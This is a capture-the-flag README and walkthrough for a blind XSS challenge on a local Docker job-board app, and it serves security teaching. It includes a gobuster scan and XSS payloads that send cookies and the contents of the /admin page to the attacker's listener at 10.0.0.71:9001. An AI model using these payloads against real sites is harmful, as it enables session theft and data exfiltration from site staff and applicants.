## Echidna: (Blind XSS) Challenge (Web / API)

The Echidna Job Board accepts job applications where users can fill out their name, email and resume. Unfortunately, applicant input is not sanitised. A potential applicant can abuse this to inject JavaScript into a hiring manager's browser session, giving access to the admin dashboard which contains the flag.

Flag location: /admin

## Build Instructions:

1. Clone the repository
2. Run `docker compose build && docker compose up`
3. Access the site at http://localhost:8000

## Writeup

Loading up the site at localhost:8000 we are greeted with a simple page:
<img width="1329" height="401" alt="image" src="https://github.com/user-attachments/assets/f12dbbd0-6015-4443-aa98-1493a55b6dec" />

First steps will be some basic enumeration to ensure we aren't missing anything. A simple directory bruteforce scan should get the info we're after:
`gobuster dir -u http://localhost:8000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt`
<img width="726" height="167" alt="image" src="https://github.com/user-attachments/assets/61cca07b-4ec1-4b5a-8334-ea4f307696a5" />

The output displays the expected urls we see on the home page. We notice that the other URLs return a 403, meaning we need to be authenticated to access them. We'll take a look at the `/apply` endpoint:
<img width="1049" height="851" alt="image" src="https://github.com/user-attachments/assets/83d0568b-09f7-4701-bd32-6c724bfd2a45" />

It's a simple job submission form. There doesn't seem to be any way to upload files, so its likely any vulnerability will be a form of template injection or XSS. In the case of XSS, this can occur when the form fails to santise user input, which would allow us to inject html (and JavaScript) into **any** user which happens to see our application.

Let's start by testing a simple Injection payload like `<img src="http://<host_ip>:port/resume"/>`. You can find a list of common ones here -> https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html. 

To get my local IP, I'll do `ip a`:
<img width="954" height="342" alt="image" src="https://github.com/user-attachments/assets/a662e0cd-76d9-43c5-82c0-c42dcba7c851" />

In my case, it's `10.0.0.71`, we can also see the docker host at `172.17.0.1`. 
Since what we are attempting here is blind XSS (We can't trigger the payload ourselves) we'll need to setup a listener on our host: `python3 -m http.server 9001`
<img width="648" height="40" alt="image" src="https://github.com/user-attachments/assets/b7b870e2-df1e-4fbb-a52a-653e7c7c845e" />

Then we'll craft our payload to be: `<img src="http://10.0.0.71:9001/resume"/>`. The idea here is that because the source of the image points back to our listener, we should in theory get a reach back from the docker host if "someone" at Echidna recruitment sees our application and loads it in their browser (Injecting the image):
<img width="827" height="721" alt="image" src="https://github.com/user-attachments/assets/08c3bad5-d6e5-47bd-b0f1-fecb134148c5" />

Our submission is successful, so there doesn't appear to be any form santitation present:
<img width="906" height="481" alt="image" src="https://github.com/user-attachments/assets/7b26f232-46c6-4e68-8733-911c56dc630a" />


A few seconds later, we get a response back at our listener:
<img width="736" height="77" alt="image" src="https://github.com/user-attachments/assets/80c9f4ab-0944-4d92-a6b5-e5ef7ccaa053" />

So now we know the form is vulnerable to XSS, and there's "someone" at Echidna reviewing the applications, so a common technique here would be to try and pivot over to that user by stealing their browser cookie, which would allow us to authenticate as them. We'll try a more malicious payload now:
`<img src=x onerror="new Image().src='http://10.0.0.71:9001/resume?cookie='+encodeURIComponent(document.cookie)"`
<img width="744" height="53" alt="image" src="https://github.com/user-attachments/assets/d2caa4f5-086c-4c06-a644-0faf0e8f0589" />

Unfortunately this doesn't return the cookie. A common security practice in web applications is to set cookies to httpOnly (read more here -> https://www.browserstack.com/guide/what-is-httponly-cookie) This attribute blocks the exfiltration of cookies outside of Http contexts (Like javascript and image tags). So we'll need to use another approach. 
Instead of using of image tag, we'll try to inject JavaScript into the Echidna Admin's browser context, which would allow us to exfiltrate the content of the page(s) that they have access to, allowing us to see what is there. We'll craft a payload like this:

<code>
  <script>
    (async () => {
      const req = await fetch('/admin');
      const res = await req.text();
      const img = new Image();
      img.src = `http://10.0.0.71:9001/resume?content=${encodeURIComponent(res)}`;
    })();
  </script>
</code>

We use an IIFE (Immediately Invoked Function Expression) so that the function runs the moment the hiring manager opens the page and exfilrates the content (res) via the image tag. The final submission:
<img width="1119" height="762" alt="image" src="https://github.com/user-attachments/assets/3e880126-3480-4783-b1a9-ddfd600e8243" />

This time, we get a response, revealing the flag embedded in the HTML content: `NOISY_ECHIDNA_ADMIN_XSS_FLAG`
<img width="1907" height="68" alt="image" src="https://github.com/user-attachments/assets/394315df-2446-4c47-9b0e-1c6712df378d" />

From here this sort of vulnerability in the wild can lead to numerous possibilities. The personal information of all applicants in the /applications path could be leaked, allowing an attacker to harvest email addresses etc. Further the admin panel could be abused to privilege escalate onto the machine itself via the abuse of CVEs in outdated software or a vulnerable file upload. This highlights the importance of HTML santisation in forms and why XSS is a rightful contender in the OWASP top 10 vulnerabilities.



